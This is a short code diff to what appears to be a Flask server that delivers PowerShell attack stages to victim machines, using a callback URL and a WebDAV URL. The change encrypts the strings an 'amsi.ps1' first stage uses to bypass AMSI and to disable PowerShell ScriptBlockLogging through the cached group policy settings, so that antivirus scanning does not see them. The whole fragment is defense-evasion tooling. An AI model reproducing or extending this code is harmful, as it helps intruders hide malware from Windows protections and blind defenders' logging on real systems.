@@ -113,14 +113,22 @@ def payload_m():
 @app.route('/0')
 def payload_0():
     """Load 0th stage"""
-    method_name = b64encode(encrypt("Bypass.AMSI".encode(), key)).decode()
+    encrypted_strings = [
+        "Bypass.AMSI",
+        "System.Management.Automation.Utils",
+        "cachedGroupPolicySettings",
+        "NonPublic,Static",
+        "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",  # noqa
+        "EnableScriptBlockLogging",
+    ]
     context = {
         "modules": modules,
         "callback_url": callback_url,
         "webdav_url": webdav_url,
         "key": key,
-        "method_name": method_name,
     }
+    for i, x in enumerate(encrypted_strings):
+        context["string%d" % i] = b64encode(encrypt(x.encode(), key)).decode()
     result = render_template(
                     "amsi.ps1",
                     **context,
